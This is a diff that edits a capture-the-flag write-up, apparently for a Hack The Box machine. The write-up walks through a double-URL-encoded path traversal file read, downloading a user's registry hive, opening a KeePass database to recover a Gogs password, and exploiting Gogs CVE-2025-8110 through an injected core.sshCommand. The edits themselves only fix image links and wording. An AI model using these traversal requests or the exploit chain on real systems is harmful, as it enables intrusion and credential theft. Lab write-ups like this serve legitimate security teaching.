@@ -241,13 +241,13 @@ Pointing Burp/browser at the SOCKS proxy (`127.0.0.1:1080`) now loads the site f
 
 ## Path Traversal LFI on gpz-op26-secure
 
-The portal lets a visitor upload a file and returns a "classified channel" download link:
+The portal lets a visitor upload a file and returns a download link:
 
 ![](./screens/4.png)
 
 A first upload attempt through the relay hit a problem as the relay's own HTTP body-handling mangled POST payloads containing `=` characters (base64), breaking the upload:
 
-./screens/5.png
+![](./screens/5.png)
 
 The bug is in ghostsurf's vendored SOCKS HTTP plugin, which splits the request on a fixed `\r\n\r\n` delimiter instead of actually locating the header/body boundary. Patching `lib/relay/servers/socksplugins/http.py`:
 
@@ -274,11 +274,11 @@ senddata = EOL.join(response)
 
 Uploads now succeed and return a working download link:
 
-./screens/6.png
+![](./screens/6.png)
 
 Testing the `/api/download/<token>` endpoint with a normal token returns the uploaded, encrypted file as expected:
 
-./screens/7.png
+![](./screens/7.png)
 
 Trying a **double URL-encoded** traversal sequence (`%252e%252e%255c` → decodes once to `%2e%2e%5c` → decodes again to `..\`) instead of a token reads arbitrary files off disk:
 
@@ -288,9 +288,9 @@ GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2
 
 Confirmed by reading `C:\Windows\win.ini`:
 
-./screens/8.png
+![](./screens/8.png)
 
-### Harvesting svc_canary's Files
+### Enumerating svc_canary's Files
 
 Still authenticated as `svc_canary` through the relay, the same traversal reads that user's own `NTUSER.DAT` registry hive:
 
@@ -298,7 +298,7 @@ Still authenticated as `svc_canary` through the relay, the same traversal reads 
 GET /api/download/..\..\..\..\..\..\..\users\svc_canary\ntuser.dat HTTP/1.1
 ```
 
-./screens/9.png
+![](./screens/9.png)
 
 ```
 proxychains wget 'http://gpz-op26-secure.ghostlink.htb/api/download/..%255c..%255c..%255c..%255cUsers%255csvc_canary%255cntuser.dat' -O ntuser.dat
@@ -331,9 +331,9 @@ unzip db.zip
   inflating: .key.keyx
 ```
 
-`db.kdbx` is a KeePass database, and `.key.keyx` is its key file — with both in hand (no master password needed), it opens directly and discloses credentials for a Gogs account, `vroth`:
+`db.kdbx` is a KeePass database, and `.key.keyx` is its key file. With both available (no master password needed), it opens directly and discloses credentials for a Gogs account, `vroth`:
 
-./screens/10.png
+![](./screens/10.png)
 
 ```
 vroth:mOo03jpsqx8JQYMBwvFP
@@ -343,15 +343,17 @@ vroth:mOo03jpsqx8JQYMBwvFP
 
 ## Gogs RCE as vroth — CVE-2025-8110
 
-Logging in to `gpz-op26-toolkits.ghostlink.htb` as `vroth` shows an existing account with a couple of repositories:
+Logging in to `gpz-op26-toolkits.ghostlink.htb` as `vroth` shows an existing account with some repositories:
 
-./screens/11.png
+![](./screens/11.png)
 
-CVE-2025-8110 abuses Gogs' Content API together with a symlink staged via a normal `git push`: a symlink pointing at `.git/config` is committed and pushed through the native git protocol (which doesn't enforce Gogs' usual path restrictions), and the API's file-write endpoint is then used to write _through_ that symlink — overwriting the real `.git/config` with attacker-controlled content, including a malicious `core.sshCommand`. The next time Gogs performs a git operation on that repository over its own internal SSH transport, the injected command executes server-side as the `git` service account.
+CVE-2025-8110 abuses Gogs' Content API together with a symlink staged via a normal `git push`: a symlink pointing at `.git/config` is committed and pushed through the native git protocol (which doesn't enforce Gogs' usual path restrictions), and the API's file-write endpoint is then used to write _through_ that symlink, overwriting the real `.git/config` with attacker-controlled content, including a malicious `core.sshCommand`. The next time Gogs performs a git operation on that repository over its own internal SSH transport, the injected command executes server-side as the `git` service account.
 
 A new repository is created for the exploit and a personal access token is generated:
 
-./screens/12.png ./screens/13.png
+![](./screens/12.png)
+
+![](./screens/13.png)
 
 ```shell
 git clone http://gpz-op26-toolkits.ghostlink.htb/vroth/rce.git
@@ -400,7 +402,7 @@ uid=1000(git) gid=1000(git) groups=1000(git)
 
 ---
 
-## Lateral Movement — Cracking nvirelli
+## Lateral Movement from git to nvirelli
 
 No common tooling (`python3`, `curl`, `wget`) is available on this host, so Gogs' SQLite database is exfiltrated over a raw TCP socket using bash's `/dev/tcp`:
 
